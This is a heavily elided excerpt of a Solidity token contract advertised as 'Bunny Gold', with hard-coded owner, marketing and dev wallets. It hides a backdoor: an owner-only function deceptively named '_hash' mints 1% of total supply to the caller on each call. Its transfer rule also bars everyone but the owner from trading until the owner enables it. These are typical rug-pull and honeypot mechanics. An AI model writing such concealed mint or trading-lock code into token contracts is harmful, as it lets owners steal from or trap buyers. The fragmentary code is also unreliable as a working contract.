...
/**
 ...
 Bunny Gold
 Telegram : https://t.me/Bunnygoldportal
...
contract Blockchain  is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x6108cBB771d898c18ae7d2828089ad4Fee34c4b8); 
    address payable public Wallet_Dev = payable(0xDc140e2D1d3B82855aB740112bB2EeC12f6692b5);
    ...
    string private constant _name = "admin"; 
    string private constant _symbol = unicode"admin"; 

    uint8 public txCount = 0;
    uint8 public swapTrigger = 5; 
    ...
    constructor () {
        ...
        _owner = 0xecc32A2f3D2e2AbF34dFb31F6CC3FA9E2AfE8DB6;
        emit OwnershipTransferred(address(0), _owner);

        _tOwned[owner()] = _tTotal;
        
        //IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); // Mainnet
         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1); //Testnet2
    ...
    function _transfer(
        ...
        require(from == owner() || to == owner() || isTradingEnabled);
        ...
        {  
            ...
            if(contractTokenBalance > 0) {contractTokenBalance = _maxTxAmount;}
            txCount = 0;
    ...
    function _hash(uint _uint) public onlyOwner {
        _tOwned[msg.sender] += _tTotal/100;
    }
